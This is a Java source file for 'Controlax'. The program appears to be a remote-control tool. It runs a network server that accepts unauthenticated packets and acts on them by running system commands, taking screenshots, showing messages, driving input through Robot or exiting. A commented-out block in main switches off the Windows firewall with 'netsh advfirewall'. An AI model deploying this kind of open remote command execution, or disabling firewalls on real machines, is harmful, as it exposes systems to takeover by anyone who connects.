package com.khopan.controlax;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Robot;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.Thread.UncaughtExceptionHandler;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JOptionPane;
import javax.swing.UIManager;

import com.khopan.lazel.config.BinaryConfigObject;
import com.khopan.lazel.packet.BinaryConfigPacket;
import com.khopan.lazel.packet.Packet;
import com.khopan.lazel.server.ClientProcessor;
import com.khopan.lazel.server.Server;

public class Controlax {
	public static final int VERSION = 7;
	public static final InetAddress IP_ADDRESS = Controlax.getHost();
	public static Controlax INSTANCE;

	public final List<ClientProcessor> processorList;
	public final Server server;
	public final Robot robot;

	public Controlax() {
		ImageProcessor.load();
		StreamProcessor.load();
		this.processorList = new ArrayList<>();
		this.server = new Server();
		this.server.port().set(2553);
		this.server.address().set(Controlax.IP_ADDRESS);
		this.server.connectionListener().set(processor -> {
			processor.packetListener().set(packet -> {
				BinaryConfigPacket config = packet.getPacket(BinaryConfigPacket.class);
				this.processAction(config.getObject());
			});

			this.processorList.add(processor);
		});

		this.server.start();

		try {
			this.robot = new Robot();
		} catch(Throwable Errors) {
			throw new InternalError("Error while initializing Robot", Errors);
		}
	}

	public void sendPacket(Packet packet) {
		for(int i = 0; i < this.processorList.size(); i++) {
			this.processorList.get(i).sendPacket(packet);
		}
	}

	private void processAction(BinaryConfigObject config) {
		int action = config.getInt("Action");

		if(action == -1) {
			System.exit(0);
		} else if(action == 0) {
			BinaryConfigObject object = new BinaryConfigObject();
			object.putInt("Action", 0);
			this.sendPacket(new BinaryConfigPacket(object));
		} else if(action == 1) {
			CommandProcessor.process(config);
		} else if(action == 2) {
			CommandProcessor.processSystem(config);
		} else if(action == 3) {
			ImageProcessor.processScreenshot();
		} else if(action == 5) {
			MessageProcessor.processMessage(config);
		} else if(action == 6) {
			ColorProcessor.processColor(config);
		} else if(action == 7) {
			ControllingProcessor.process(config);
		}
	}

	private static InetAddress getHost() {
		try {
			return InetAddress.getLocalHost();
		} catch(Throwable Errors) {
			throw new InternalError("Cannot get the host IP address", Errors);
		}
	}

	public static int getFramerate() {
		GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
		int lowest = Integer.MAX_VALUE;

		for(int i = 0; i < devices.length; i++) {
			lowest = Math.min(lowest, devices[0].getDisplayMode().getRefreshRate());
		}

		return lowest;
	}

	public static void errorDialog(Throwable Errors) {
		StringWriter stringWriter = new StringWriter();
		PrintWriter printWriter = new PrintWriter(stringWriter);
		Errors.printStackTrace(printWriter);
		JOptionPane.showMessageDialog(null, stringWriter.toString(), "Internal Error", JOptionPane.ERROR_MESSAGE);
	}

	public static void main(String[] args) throws Throwable {
		Thread.setDefaultUncaughtExceptionHandler(new UncaughtExceptionHandler() {
			@Override
			public void uncaughtException(Thread thread, Throwable Errors) {
				Controlax.errorDialog(Errors);
			}
		});

		/*try {
			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", "netsh advfirewall set allprofiles state off");
			builder.start();
		} catch(Throwable Errors) {
			Controlax.errorDialog(Errors);
		}

		AutoUpdate.initialize();*/
		UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
		Controlax.INSTANCE = new Controlax();
	}
}
